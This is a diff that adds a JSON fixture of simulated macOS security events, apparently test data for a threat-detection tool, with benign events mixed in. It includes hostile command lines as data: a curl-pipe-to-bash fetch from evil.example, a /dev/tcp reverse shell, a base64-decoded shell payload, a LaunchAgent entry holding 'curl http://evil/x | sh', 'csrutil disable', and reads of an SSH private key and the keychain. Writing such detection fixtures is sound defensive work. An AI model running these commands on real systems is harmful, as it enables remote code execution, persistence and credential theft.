@@ -1,0 +1,939 @@
+[
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "bash",
+  "cmdline": "curl -fsSL http://evil.example/x.sh | bash",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "python3",
+  "cmdline": "python3 -c 'import os;print(os.getcwd())'",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "dropper",
+  "cmdline": "",
+  "path": "/tmp/dropper",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "com.apple.WebKit",
+  "cmdline": "",
+  "path": "/Users/x/Library/com.apple.WebKit",
+  "severity": "info",
+  "subject": {
+   "masquerade": true
+  },
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "zsh",
+  "cmdline": "echo aGVsbG8= | base64 -d | sh",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "bash",
+  "cmdline": "bash -i >& /dev/tcp/198.51.100.9/4444 0>&1",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "persistence.add",
+  "pid": 300,
+  "process": "launchd",
+  "cmdline": "",
+  "path": "/Users/x/Library/LaunchAgents/com.evil.plist",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "persistence.modify",
+  "pid": 300,
+  "process": "launchd",
+  "cmdline": "",
+  "path": "/Library/LaunchDaemons/com.evil.plist",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "persistence.add",
+  "pid": 300,
+  "process": "launchd",
+  "cmdline": "",
+  "path": "/Users/x/Library/LaunchAgents/com.evil.plist",
+  "severity": "info",
+  "subject": {
+   "suspicious": [
+    "/tmp/payload",
+    "curl http://evil/x | sh"
+   ]
+  },
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "csrutil",
+  "cmdline": "csrutil disable",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "defense.cs_invalidated",
+  "pid": 300,
+  "process": "evil",
+  "cmdline": "",
+  "path": "/Users/x/Library/evil",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "defense.gatekeeper_override",
+  "pid": 300,
+  "process": "open",
+  "cmdline": "open /Applications/Evil.app",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "defense.removed",
+  "pid": 300,
+  "process": "falconctl",
+  "cmdline": "",
+  "path": "/Applications/Falcon.app",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "file.open",
+  "pid": 300,
+  "process": "cat",
+  "cmdline": "",
+  "path": "/Users/x/.ssh/id_ed25519",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "credential.access",
+  "pid": 300,
+  "process": "securityd",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "note": "批量读取 login.keychain"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.listen",
+  "pid": 300,
+  "process": "redis-server",
+  "cmdline": "",
+  "path": "",
+  "severity": "high",
+  "subject": {
+   "service": "redis",
+   "addr": "0.0.0.0:6379"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 300,
+  "process": "beacon",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 8081,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 300,
+  "process": "beacon",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "rport": 4444,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 300,
+  "process": "beacon",
+  "cmdline": "",
+  "path": "",
+  "severity": "critical",
+  "subject": {
+   "rip": "203.0.113.9",
+   "raddr": "evil.example"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "backdoor",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1000,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1001,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1002,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1003,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1004,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1005,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1006,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1007,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1008,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1009,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1010,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1011,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1012,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1013,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1014,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1015,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1016,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1017,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1018,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1019,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1020,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1021,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1022,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1023,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 400,
+  "process": "scanner",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 1024,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "auth.fail",
+  "pid": 300,
+  "process": "sudo",
+  "cmdline": "sudo -u root id",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "auth.fail",
+  "pid": 300,
+  "process": "sudo",
+  "cmdline": "sudo -u root id",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "auth.fail",
+  "pid": 300,
+  "process": "sudo",
+  "cmdline": "sudo -u root id",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "auth.fail",
+  "pid": 300,
+  "process": "sudo",
+  "cmdline": "sudo -u root id",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "auth.fail",
+  "pid": 300,
+  "process": "sudo",
+  "cmdline": "sudo -u root id",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "auth.fail",
+  "pid": 300,
+  "process": "sudo",
+  "cmdline": "sudo -u root id",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "auth.fail",
+  "pid": 300,
+  "process": "sudo",
+  "cmdline": "sudo -u root id",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "auth.success",
+  "pid": 300,
+  "process": "sshd",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "from": "10.0.0.5"
+  },
+  "user": "u"
+ },
+ {
+  "kind": "integrity.change",
+  "pid": 300,
+  "process": "vim",
+  "cmdline": "",
+  "path": "/Users/x/.ssh/authorized_keys",
+  "severity": "info",
+  "subject": {
+   "reason": "mtime"
+  },
+  "user": ""
+ },
+ {
+  "kind": "integrity.change",
+  "pid": 300,
+  "process": "vim",
+  "cmdline": "",
+  "path": "/Users/x/.zshrc",
+  "severity": "info",
+  "subject": {
+   "reason": "mtime"
+  },
+  "user": ""
+ },
+ {
+  "kind": "baseline.drift",
+  "pid": 300,
+  "process": "atfield",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "name": "SIP",
+   "from": "pass",
+   "to": "fail"
+  },
+  "user": ""
+ },
+ {
+  "kind": "process.hidden",
+  "pid": 999,
+  "process": "evil",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "av.detect",
+  "pid": 300,
+  "process": "XProtect",
+  "cmdline": "/tmp/evil.bin: XProtect.Yara.OSX.Evil",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "tcc.deny",
+  "pid": 300,
+  "process": "helper",
+  "cmdline": "访问通讯录被拒绝",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "tcc.deny",
+  "pid": 300,
+  "process": "helper",
+  "cmdline": "访问通讯录被拒绝",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "tcc.deny",
+  "pid": 300,
+  "process": "helper",
+  "cmdline": "访问通讯录被拒绝",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "tcc.deny",
+  "pid": 300,
+  "process": "helper",
+  "cmdline": "访问通讯录被拒绝",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "zsh",
+  "cmdline": "whoami",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "zsh",
+  "cmdline": "id",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "zsh",
+  "cmdline": "hostname",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "zsh",
+  "cmdline": "ifconfig -a",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "zsh",
+  "cmdline": "netstat -an",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 300,
+  "process": "zsh",
+  "cmdline": "ps aux",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "file.write",
+  "pid": 300,
+  "process": "zsh",
+  "cmdline": "",
+  "path": "/Users/x/.zsh_history",
+  "severity": "info",
+  "subject": {
+   "delta_bytes": 128
+  },
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 500,
+  "process": "curl",
+  "cmdline": "curl -O http://evil.example/a.txt",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 500,
+  "process": "python3",
+  "cmdline": "python3 ./manage.py migrate",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 500,
+  "process": "git",
+  "cmdline": "",
+  "path": "/usr/local/bin/git",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 500,
+  "process": "base64",
+  "cmdline": "base64 -w0 ./report.pdf",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 500,
+  "process": "nc",
+  "cmdline": "nc -l 4444 -k",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "net.listen",
+  "pid": 500,
+  "process": "redis-server",
+  "cmdline": "",
+  "path": "",
+  "severity": "medium",
+  "subject": {
+   "service": "redis",
+   "addr": "127.0.0.1:6379"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 500,
+  "process": "curl",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "public": true,
+   "rport": 443,
+   "raddr": "1.1.1.1"
+  },
+  "user": ""
+ },
+ {
+  "kind": "net.connect",
+  "pid": 500,
+  "process": "beacon",
+  "cmdline": "",
+  "path": "",
+  "severity": "info",
+  "subject": {
+   "rport": 8081,
+   "raddr": "198.51.100.7"
+  },
+  "user": ""
+ },
+ {
+  "kind": "file.write",
+  "pid": 500,
+  "process": "vim",
+  "cmdline": "",
+  "path": "/Users/x/Documents/report.txt",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ },
+ {
+  "kind": "process.start",
+  "pid": 500,
+  "process": "csrutil",
+  "cmdline": "csrutil status",
+  "path": "",
+  "severity": "info",
+  "subject": {},
+  "user": ""
+ }
+]
